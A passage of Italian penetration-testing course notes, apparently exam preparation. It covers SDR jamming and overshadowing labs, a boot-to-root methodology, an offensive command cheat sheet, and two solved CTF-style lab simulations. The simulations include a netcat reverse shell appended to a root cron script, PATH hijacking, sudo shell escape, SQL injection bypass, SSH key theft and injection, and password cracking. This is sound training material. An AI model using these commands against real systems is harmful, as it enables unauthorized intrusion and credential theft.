  - *Eye Diagram (Diagramma a Occhio):* sovrapposizione delle tracce temporali per intervalli multipli di simbolo; apertura dell'occhio indicativa del margine di immunità al rumore e all'interferenza intersimbolica (ISI); chiusura dell'occhio in corrispondenza di canali fortemente degradati.
- **Analisi delle Prestazioni al Variare di $E_b/N_0$:**
  - Confronto dettagliato tra condizioni di canale eccellente ($E_b/N_0 = 10\text{ dB}$, $12\text{ dB}$) con costellazioni compatte e occhio aperto, e condizioni di canale critico ($E_b/N_0 = 3\text{ dB}$, $6\text{ dB}$) con dispersione dei simboli verso la linea di decisione e occhio quasi chiuso.
  - Misura della potenza media del segnale rettangolare: verifica teorica ($A^2 = 1$) e strumentale tramite misura del valore efficace (RMS, $P = \text{RMS}^2 = 1$).
- **Simulazione Monte Carlo del Bit Error Rate (BER):**
  - Connessione del blocco di calcolo errore all'ambiente MATLAB (`To Workspace`).
  - Esecuzione automatizzata tramite script MATLAB per valori di $E_b/N_0$ da $0\text{ dB}$ a $12\text{ dB}$ (su blocchi da 101.000 simboli).
  - Tabulazione dei risultati: evidenza della rapida caduta esponenziale del BER (da $\approx 7.96\%$ a $0\text{ dB}$ fino a $0$ errori rilevati da $10\text{ dB}$ in poi), confermando l'andamento della curva teorica $Q(\sqrt{2 E_b/N_0})$.
- **Sistemi ad Accesso Multiplo e Spread Spectrum:**
  - Confronto concettuale: TDMA (divisione temporale), FDMA (divisione frequenziale), OFDM (multi-portanti ortogonali ad alta efficienza), CDMA (separazione tramite sequenze di codice ortogonali).
  - Regole matematiche CDMA:
    $$\text{Codifica: } Z_{i,m} = d_i \cdot c_m \qquad \text{Decodifica: } D_i = \sum_{m=1}^{M} Z_{i,m} \cdot c_m$$
- **Simulazione DSSS (Direct Sequence Spread Spectrum):**
  - Modello Simulink `simulateDSSS_binaryMessage_VDSI2026.slx`:
    - Lato trasmettitore: moltiplicazione del flusso informativo BPSK per una sequenza pseudo-casuale ad alta velocità (*chipping sequence*, 16 chip per singolo bit).
    - Fenomeno dello **Spreading:** poiché il *chip rate* è notevolmente superiore al *bit rate*, l'occupazione spettrale del segnale si allarga significativamente (aumento del $+44\%$ della banda occupata, da $101.59\text{ Hz}$ a $146.76\text{ Hz}$).
    - Densità spettrale: la potenza totale rimane invariata ($\approx 29.5 - 29.9\text{ dBm}$), ma il segnale viene "spalmato" in frequenza, facendo sprofondare il picco di potenza vicino al noise floor.
    - Lato ricevitore: operazione inversa di **De-Spreading** mediante moltiplicazione per la medesima sequenza di chip sincronizzata.
    - Effetto del De-Spreading: ricompressione della banda del segnale utile (riduzione del $-21\%$, da $163.3\text{ Hz}$ a $129.4\text{ Hz}$) e ricostruzione perfetta dei dati tramite blocco Integrate and Dump.
    - **Immunità al Jamming a Banda Stretta:** un segnale di disturbo interferente narrowband presente sul canale non possiede la sequenza di codice corretta; al momento della decodifica al ricevitore, il segnale utile viene ricompattato a banda stretta mentre il disturbo del jammer viene spalmato su tutta la banda, abbattendone drasticamente la densità di potenza ed eliminandone l'effetto distruttivo.
    - Trade-off ingegneristico: DSSS garantisce massima robustezza e riservatezza a scapito di una drastica inefficienza nell'occupazione di banda rispetto a tecnologie moderne come OFDM.

---

### Laboratorio 3 (Simulink/MATLAB) – Ricezione DBPSK Reale, Decodifica ASCII e Attacchi Over-The-Air
- **Sistemi di Comunicazione Coerenti vs Non Coerenti:**
  - Nei sistemi coerenti (es. BPSK classico), il ricevitore deve agganciare e mantenere sincronizzati perfettamente sia la frequenza che la fase della portante locale rispetto a quella del trasmettitore; discrepanze anche minime provocano rotazioni di costellazione ed errori decisionali irreversibili.
  - Nei sistemi non coerenti, la sincronizzazione assoluta della fase non è richiesta.
- **Modulazione DBPSK (Differential Binary Phase Shift Keying):**
  - L'informazione logica non è codificata nella fase assoluta del simbolo, ma nella **variazione di fase tra due simboli consecutivi**:
    - Bit `0`: nessuna variazione di fase rispetto al simbolo precedente ($\Delta\phi = 0$).
    - Bit `1`: inversione di fase rispetto al simbolo precedente ($\Delta\phi = \pi$).
- **Ricevitore DBPSK Hardware reale in Simulink:**
  - Modello `receiveDBPSK_RTLSDR_030626.slx`:
    - Interfacciamento dal vivo con antenna RTL-SDR.
    - Compensazione dell'offset di frequenza iniziale.
    - Stadio di decimazione ($x[3n]$) per ridurre il carico di campioni computazionali.
    - Filtraggio passabanda con blocco *Filter Designer*.
    - Sincronizzatore di simbolo (*Symbol Synchronizer*) per campionare il segnale all'istante di massima apertura dell'occhio.
    - Salvataggio dei campioni complessi della variabile `yout` nel workspace MATLAB.
  - Visualizzazione della costellazione: rotazione circolare continua dei punti sul piano I/Q dovuta alla presenza del naturale disallineamento in frequenza ($\Delta f$) tra gli oscillatori hardware di trasmissione e ricezione.
- **Elaborazione e Demodulazione Differenziale in MATLAB:**
  - Formulazione analitica del segnale campionato:
    $$r(k) \approx C \cdot m(k) \cdot e^{j(2\pi \Delta f t_k + \phi)}$$
  - Algoritmo di demodulazione differenziale tramite moltiplicazione per il complesso coniugato del simbolo precedente:
    $$d(k) = r(k) \cdot r^*(k-1)$$
  - Sostituzione ed eliminazione del termine di fase costante $\phi$: la rotazione residua dovuta al termine $e^{j 2\pi \Delta f T}$ risulta trascurabile su simboli adiacenti, consentendo di isolare il prodotto tra simboli informativi consecutivi:
    $$d(k) \propto m(k) \cdot m(k-1)$$
  - **Regola di Decisione Binaria:**
    - Se $\text{Re}\{d(k)\} > 0 \implies$ simboli concordi $\implies$ **Bit 0**.
    - Se $\text{Re}\{d(k)\} < 0 \implies$ simboli discordi (salto di fase) $\implies$ **Bit 1**.
- **Framing e Decodifica del Messaggio di Testo:**
  - Impiego di un preambolo di sincronizzazione noto di 16 bit: `[0 0 0 0 1 1 1 1 0 0 0 0 1 1 1 1]`.
  - Rilevamento delle delimitazioni di inizio e fine trama tramite l'oggetto `comm.PreambleDetector`.
  - Estrazione del payload binario compreso tra i preamboli, raggruppamento in vettori da 8 bit (`reshape`), conversione da binario a decimale (`bin2dec`) e decodifica dei caratteri ASCII (`char`).
  - Risultato dell'esperimento di riferimento: ricezione corretta della stringa `"Grande!!! Ci sei riuscita/o!\n"`.
- **Esperimenti Pratici di Rilevamento Attacchi Wireless Over-The-Air:**
  - **Esperimento 1 – Tentativo di Overshadowing Fallito:**
    - Lo spettro appare intatto, ma la costellazione I/Q si presenta dispersa in una nuvola caotica.
    - Il software rileva correttamente i preamboli (la struttura della trama è preservata), ma il payload decodificato risulta gravemente corrotto (`"Wlà ..."`).
    - Diagnosi: interferenza o potenza dell'attaccante insufficiente a rimpiazzare il segnale legittimo, determinando corruzione parziale dei simboli.
  - **Esperimento 2 – Attacco di Noise Jamming (Annihilation):**
    - Spettro fortemente alterato con innalzamento uniforme del noise floor su tutta la banda; costellazione completamente collassata senza separazione tra i quadranti.
    - L'algoritmo fallisce completamente: impossibile rilevare i preamboli e delimitare i messaggi.
    - Diagnosi: attacco di Denial of Service radio tramite disturbo deliberato.
    - Contromisure discusse: adozione di tecniche di **Frequency Hopping** (cambio pseudo-casuale concordato della portante) o schemi di trasmissione **DSSS**.
  - **Esperimento 3 – Attacco di Overshadowing Eseguito con Successo:**
    - Lo spettro mostra una portante strutturata a livello di potenza significativamente superiore rispetto al riferimento; costellazione pulita e punti chiaramente decisi.
    - Il codice rileva 3 preamboli ed estrae messaggi perfettamente leggibili e privi di errori, ma il contenuto testuale risulta sostituito dall'attaccante:
      `"Un alieno ha mangiato i bit!\n"`.
    - Diagnosi: **Overshadowing**; l'attaccante ha trasmesso una trama alternativa con potenza radio sovrastante rispetto alla sorgente legittima, inducendo il ricevitore ad agganciarsi ed estrarre il messaggio arbitrario iniettato.
- **Tassonomia Conclusiva degli Attacchi sul Canale Radio:**
  - *Message Creation:* trasmissione malevola in assenza di trasmissioni legittime.
  - *Annihilation / Noise Jamming:* cancellazione o corruzione del messaggio legittimo tramite disturbo.
  - *Symbol Flipping:* alterazione di singoli bit/simboli del messaggio originale.
  - *Overshadowing:* sovrapposizione ad alta potenza per rimpiazzare integralmente il messaggio della vittima.

---

### Modulo 3 Short – Compendio Formule e Sintesi Rapida
- **Formulario essenziale:**
  - Conversione in dBm: $P_{\text{dBm}} = 10 \log_{10}(P_{\text{mW}})$.
  - Modello del canale affetto da rumore: $r(t) = s(t) + n(t)$.
  - Calcolo SNR logaritmico: $\text{SNR}(\text{dB}) = P_{\text{Signal}}(\text{dBm}) - P_{\text{Noise}}(\text{dBm})$.
  - Portante: $c(t) = A \cos(2\pi f_c t + \phi)$.
  - Bit Error Rate: $\text{BER} = \frac{\text{bit errati}}{\text{bit totali trasmessi}}$.
  - Prodotto differenziale DBPSK: $d(k) = r(k) \cdot r^*(k-1)$.
- **Sintesi compatta:** classificazione dei jammer, riassunto dei protocolli ad accesso multiplo (TDMA, FDMA, OFDM, CDMA), definizione operativa di DSSS e DBPSK, riepilogo dei tre livelli di sicurezza delle reti cellulari e concetti chiave dei due seminari 5G.

---

## 4. AREA ESAME: Metodologia Boot-to-Root, Compendio Operativo e Simulazioni Risolte

### Metodologia Operativa Boot-to-Root in 8 Fasi
1. **Reconnaissance & External Enumeration:** scansione host, mappatura porte, enumerazione DNS e identificazione servizi esposti.
2. **Web & Service Enumeration:** virtual hosting, sitemap, directory busting, scraping endpoint, leak di codice sorgente e file di backup.
3. **Initial Exploitation:** identificazione di vulnerabilità software o logiche (SQLi, Command Injection, LFI/RFI, file upload non validato, brute force credenziali).
4. **Initial Access & Shell Stabilization:** ottenimento della prima reverse shell (spesso con permessi limitati tipo `www-data`) e stabilizzazione TTY interattiva.
5. **Local Privilege Escalation Enumeration:** raccolta sistematica di configurazioni interne (kernel, cron, permessi sudo, binari SUID, socket, capabilities, chiavi SSH esposte).
6. **Finding Attack Vectors:** analisi critica delle informazioni per individuare misconfigurazioni concrete e binari abusabili.
7. **Privilege Escalation Exploitation:** acquisizione dei privilegi di root (abuso SUID/sudo con GTFOBins, PATH hijacking, manipolazione script di cron, scrittura UID 0 su `/etc/passwd`).
8. **Documentation & Reporting:** redazione della relazione formale comprendente contesto, evidenze, impatto, passi di sfruttamento e mitigazioni consigliate.

---

### Compendio di Comandi e Report Utility
- **Password Cracking:**
  - Creazione wordlist con `crunch` e `cewl` (profondità `-d`, lunghezza minima `-m`).
  - Generazione username con `username-anarchy`.
  - Identificazione algoritmi con `hashid` e `hashid -j`.
  - Cracking con John the Ripper (formati raw, `--single`, `--rules`, gestione custom rules in `.conf`).
  - Estrazione hash archivi con `zip2john` e `7z2john`.
  - Cracking credenziali di sistema tramite `unshadow`.
  - Brute force online con `Hydra` su protocolli standard (SSH, FTP, POP3) e interfacce web (moduli `http-post-form`, `http-get-form`, gestione token e stringhe di fallimento).
- **Network Enumeration:**
  - Query DNS TXT (`dig txt`), Zone Transfer AXFR (`dig axfr`), enumerazione ricorsiva con `dnsenum`.
  - Scansioni Nmap complete: rilevamento versioni (`-sV`), script di default (`-sC`), scansioni stealth (`-sS`), range di porte estesi (`-p-` o `-p 62260-65535`), disabilitazione ping (`-P0`).
  - Connessioni raw e banner grabbing con `nc`.
  - Verifica di metodi HTTP pericolosi (es. `curl -X TRACE`).
- **Web Discovery & Exploitation:**
  - Censimento virtual host con `gobuster vhost` (opzione append domain `--ad`) e `wfuzz` (filtraggio risposte con `--hh`).
  - Content discovery con `gobuster dir` e `feroxbuster`.
  - Recupero repository Git esposti con `git_dumper.py`.
  - Payload SQL injection per login bypass (`' OR '1'='1`) ed estrazione via `UNION SELECT`.
  - OS Command Injection tramite separatori `;`, `|`, `&&`.
  - LFI e Directory Traversal con bypass URL-encoding (`%2F`).
  - Lettura sorgenti PHP con wrapper `php://filter/read=convert.base64-encode/resource=...`.
  - Iniezione codice tramite `data://` wrapper.
  - Log Poisoning su `/var/log/apache2/access.log` tramite iniezione PHP nello User-Agent.
  - Bypass dei controlli di upload tramite alterazione del MIME type (`Content-Type: image/png`).
  - Web shell persistenti con `proc_open()`.
- **Pivoting e Movimento Laterale:**
  - Configurazione Local Port Forwarding (`ssh -L porta_locale:ip_interno:porta_remota`).
  - Configurazione Remote Port Forwarding (`ssh -R porta_remota:localhost:porta_locale`).
  - Esecuzione di proxy SOCKS e tunneling con `chisel`.
- **Privilege Escalation Linux:**
  - Comandi di enumerazione identità: `whoami`, `id`, `groups`.
  - Ispezione kernel: `uname -a`.
  - Analisi permessi e file: `find / -perm -u=s -type f 2>/dev/null`, `getcap -r / 2>/dev/null`, `sudo -l`.
  - Monitoraggio cronjob e processi in background con `pspy64`.
  - Sfruttamento di binari secondo le metodologie di [GTFOBins](https://gtfobins.github.io/).
  - Esecuzione di **PATH Hijacking** su binari SUID con comandi relativi.
  - Sfruttamento di script di cronjob con permessi di scrittura per l'utente locale.
  - Password reuse su utenze di sistema (`su nomeutente`).
  - Censimento e furto di chiavi SSH private (`id_rsa`, `chmod 600`).
  - Persistenza tramite iniezione di chiavi pubbliche in `authorized_keys`.
  - Creazione manuale di utente root in `/etc/passwd` con password generata tramite `openssl passwd -6`.

---

### Struttura Standard del Report di Valutazione (Template Report)
Per ogni vulnerabilità individuata nella prova pratica d'esame, la documentazione richiede l'articolazione obbligatoria dei seguenti elementi:
1. **Titolo della vulnerabilità:** identificazione formale (es. *SQL Injection nel modulo di autenticazione*, *SUID Path Hijacking su utility custom*).
2. **Contesto:** ubicazione esatta della falla (URL, endpoint, parametro, file di configurazione, percorso binario, porta di rete).
3. **Evidenza (Proof of Concept):** comando, payload o richiesta HTTP utilizzata per dimostrare l'esistenza della problematica.
4. **Impatto:** conseguenze potenziali per l'infrastruttura (accesso non autorizzato, estrazione credenziali, Denial of Service, Remote Code Execution, scalata completa a root).
5. **Passi di Sfruttamento:** procedura passo-passo per riprodurre l'accesso o l'elevazione dei privilegi.
6. **Mitigazione:** raccomandazioni tecniche e best practice per la bonifica del sistema (prepared statement, whitelist di validazione, percorsi assoluti nei binari, restrizioni firewall, principio del minimo privilegio).

---

### Simulazioni d'Esame Risolte nei Dettagli

#### Simulazione 1 (`REPORT PROVA ESAME.md`)
- **Target IP:** `192.168.14.15`
- **Fase 1 – Ricognizione e scansione porte:**
  - Esecuzione scansione completa TCP con Nmap (`nmap -sT -p- 192.168.14.15`).
  - Individuazione porte aperte: 21 (FTP vsftpd 2.0.8), 22 (SSH OpenSSH 9.2p1), 80 (HTTP Nginx 1.22.1), 443 (HTTPS Nginx 1.22.1 con certificato SSL emesso per `muntrea-energy.vdsi`).
- **Fase 2 – Web Enumeration & Content Discovery:**
  - Scansione con `feroxbuster --insecure` su porta 443 con wordlist SecLists.
  - Individuazione della cartella protetta `/internal/resources/backup/`.
  - Download di file di configurazione obsoleti: file di backup `temp5712837.bak`.
  - Estrazione credenziali FTP in chiaro: `muntrea-filemanager : Muntrea2026!`.
- **Fase 3 – Accesso FTP e Information Disclosure:**
  - Login sul server FTP con le credenziali individuate.
  - Reperimento della prima flag: `VDSI{4dm1n_fl4g_h3r3}`.
  - Lettura del manuale interno con indicazione del metodo di autenticazione accettato (`RSA Private Key`).
- **Fase 4 – Ricognizione utenti e furto chiave SSH:**
  - Identificazione degli utenti di sistema presenti in `/etc/passwd`: `muntrea-operator`, `muntrea-sysadmin`, `muntrea-filemanager`.
  - Individuazione della chiave privata SSH in chiaro nel percorso `/home/muntrea-operator/.ssh/id_rsa`.
  - Salvataggio locale della chiave, impostazione corretta dei permessi (`chmod 600`) e login remoto via SSH:
    `ssh -i ./id_rsa muntrea-operator@192.168.14.15`.
  - Reperimento flag utente: `VDSI{nucl3ar_t3ch_acc3ss_gr4nt3d}`.
- **Fase 5 – Privilege Escalation locale (Step 1: PATH Hijacking):**
  - Scansione binari SUID con `find / -perm -u=s -type f 2>/dev/null`.
  - Rilevamento del binario SUID anomalo `/usr/bin/sys-monitor`.
  - Analisi del binario tramite `strings`: individuata l'invocazione del comando `cat` con percorso relativo anziché assoluto (`/bin/cat`).
  - Sfruttamento del **PATH Hijacking**:
    1. Creazione di un falso script `cat` in `/tmp` contenente `/bin/bash -p`.
    2. Assegnazione permessi di esecuzione (`chmod +x /tmp/cat`).
    3. Esportazione del PATH modificato (`export PATH=/tmp:$PATH`).
    4. Esecuzione di `/usr/bin/sys-monitor` per ottenere una shell con privilegi elevati.
- **Fase 6 – Privilege Escalation a Root (Step 2: Writable Cronjob):**
  - Caricamento dell'eseguibile `pspy64` sulla macchina target tramite `scp`.
  - Monitoraggio dei processi: rilevata l'esecuzione periodica da parte di root (UID=0) dello script bash:
    `/opt/scripts/internal/infra/monitor-critical-services.sh`.
  - Verifica permessi: lo script risultava modificabile dall'utente corrente.
  - Inserimento di payload di reverse shell in append allo script (`nc -lvp 4444 -e /bin/bash`).
  - Connessione alla porta 4444 e ottenimento della shell root definitiva con cattura della flag:
    `VDSI{mun7r3a_c0ntr0l_full_m4st3ry}`.
- **Moduli Aggiuntivi della Simulazione 1:**
  - *Cracking Keepass:* esportazione dell'hash da database protetto `secrets.kdbx` con `keepass2john` e cracking della master password (`strawberry123`) con John the Ripper $\to$ flag `VDSI{k33p4ss_cr4ck_succ3ss_2026}`.
  - *Bypass File Upload con Antivirus:* intercettazione della richiesta di upload con Burp Suite, alterazione del MIME type a `application/x-msdownload`, caricamento di webshell PHP basata su `fsockopen()` e `proc_open()` e attivazione della reverse shell su listener Netcat.

---

#### Simulazione 2 (`Report prova esame 2.md`)
- **Target IP:** `192.168.14.16`
- **Fase 1 – Ricognizione porte e dominio:**
  - Scansione Nmap delle prime 1000 porte (`nmap --top-ports 1000 192.168.14.16`): 2 porte aperte (80 HTTP e 22 SSH).
  - Navigazione sul portale web e identificazione del dominio istituzionale dai contatti email: `orbetellobiblio.vdsi`.
  - Configurazione della risoluzione locale in `/etc/hosts`: `192.168.14.16 orbetellobiblio.vdsi`.
- **Fase 2 – Virtual Host Enumeration e Content Discovery:**
  - Ricognizione virtual host con Gobuster e append-domain abilitato:
    `gobuster vhost --ad -u http://orbetellobiblio.vdsi -w subdomains-top1million-20000.txt`.
  - Individuazione del sotto-dominio di gestione: `management.orbetellobiblio.vdsi`.
  - Scansione ricorsiva dei percorsi con Feroxbuster su `management.orbetellobiblio.vdsi`.
  - Individuazione dell'endpoint `/identity` che reindirizza al portale di Identity Access Management (IAM):
    `http://casdoor.admin.orbetellobiblio.vdsi/login`.
  - Rilevazione del software e della versione esatta dalle note interne (`notes.html`): **Casdoor v3.54.0**.
- **Fase 3 – Vulnerability Assessment & Exploitation (CVE-2026-6815):**
  - Ricerca vulnerabilità note su Exploit-DB per Casdoor v3.54.0: identificata la vulnerabilità **CVE-2026-6815** (Arbitrary File Write via Path Traversal Provider).
  - Reperimento credenziali di default dell'amministratore: `admin : 123`.
  - Esecuzione dello script di exploit in Python (`CVE-2026-6815.py`): autenticazione con credenziali di default, creazione di un provider maligno con path traversal e scrittura arbitraria della propria chiave pubblica SSH locale (`/home/kali/.ssh/id_ed25519.pub`) all'interno del file `/home/casdoor/.ssh/authorized_keys` sul server bersaglio.
- **Fase 4 – Accesso Iniziale e Lateral Movement:**
  - Connessione SSH diretta senza password sfruttando la chiave iniettata:
    `ssh -i /home/kali/.ssh/id_ed25519 casdoor@192.168.14.16`.
  - Cattura prima flag: `VDSI{c4sd00r_1n1t14l_4cc3ss_g41n3d}`.
  - Movimento laterale verso l'utente `developer` sfruttando password reuse (`developer : developer`) $\to$ cattura flag `user.txt`.
- **Fase 5 – Privilege Escalation a Root tramite Sudo Abuse su `mawk`:**
  - Controllo dei comandi consentiti con `sudo -l`: l'utente può eseguire con sudo il binario `/usr/bin/mawk`.
  - Consultazione di GTFOBins per il binario `mawk`: identificata tecnica di shell escape mediante blocco `BEGIN`.
  - Esecuzione del comando per ottenere la shell di root:
    `sudo /usr/bin/mawk 'BEGIN {system("/bin/bash")}'`.
  - Ottenimento privilegi di root e lettura della flag finale: `VDSI{m4wk_sUD0_r00t_c0mpr0m1s3}`.
- **Fase 6 – Parte 2: DNS AXFR su porta custom ed Esfiltrazione:**
  - Analisi infrastruttura aziendale `vdsi-corp.xyz` su porta non standard 58053.
  - Esecuzione di richiesta AXFR con dig sulla porta dedicata:
    `dig @192.168.14.16 vdsi-corp.xyz -p 58053 axfr`.
  - Estrazione dei record DNS di zona e scoperta del sottodominio nascosto di diagnostica interna:
    `n3tt00ls.vdsi-corp.xyz`.
  - Accesso al portale sulla porta 58090 (`http://n3tt00ls.vdsi-corp.xyz:58090/`) $\to$ recupero flag `VDSI{diagnostic_portal_discovered}`.
  - Decodifica dell'esfiltrazione dati esadecimale (Hex-to-File) $\to$ flag `VDSI{dns_exf1ltr4t10n_d3c0d3d_2026}`.
- **Fase 7 – Parte 3: SQL Injection Login Bypass su Portale Interno:**
  - Ispezione del servizio sulla porta 58088 (`http://192.168.14.16:58088/`).
  - Individuazione dell'endpoint hash-obfuscated `d03f8e7a83d4c6d3bc8b3d688cf0e78a/login.php`.
  - Autenticazione con payload classico SQLi `' OR '1'='1` su entrambi i campi username e password.
  - Accesso confermato ed estrazione della flag: `VDSI{sqli_breakout_debug_success}`.

---

## 5. Sintesi delle Competenze Chiave e Mappa Concettuale

```
                                  VULNERABILITÀ & PENETRATION TESTING
                                                  │
         ┌────────────────────────────────────────┼────────────────────────────────────────┐
         │                                        │                                        │
     MODULO 1                                 MODULO 2                                 MODULO 3
(OS, Privesc & Docker)               (Network & Web Exploitation)             (Wireless, SDR & Lab Simulink)
         │                                        │                                        │
 ├── Linux Fundamentals                   ├── Network Recon (DNS, Nmap)            ├── SDR Theory & Zero-IF
 ├── Password Theory & Cracking           ├── Traffic Sniffing (Wireshark)         ├── Mobile 4G/5G (5GMap, IMSI)
 │   (Hashcat, John, Hydra, Unshadow)     ├── Shells & Pivoting (SSH -L/-R)        ├── 5G Positioning & Meaconing
 ├── Windows SAM/NTDS & Responder         ├── Web Enumeration (Vhost, Gobuster)    ├── Lab 1: RTL-SDR & Jamming
 ├── Linux Privesc Methodology            ├── Injection (Command, SQLi)            ├── Lab 2: BPSK, AWGN & DSSS
 ├── Exploiting SUID, PATH, Cron, Caps    ├── Advanced Web (LFI, Wrappers, SSRF)   └── Lab 3: DBPSK & Attacks
 └── Docker Breakout & Namespaces         └── Wireless Physics, Modulation (QAM)        (Overshadowing, Noise)
                                                  │
                                                  ▼
                                            AREA ESAME
                                   (Boot-to-Root Methodology)
                                                  │
                          ├── Reporting Professionale (Contesto, Proof, Mitigazione)
                          ├── Cheatsheet Operativo (1800+ righe)
                          ├── Simulazione 1 (FTP, SUID Path Hijacking, Root Cronjob, Keepass)
                          └── Simulazione 2 (Casdoor CVE-2026-6815, Sudo Mawk, DNS AXFR, SQLi)
```
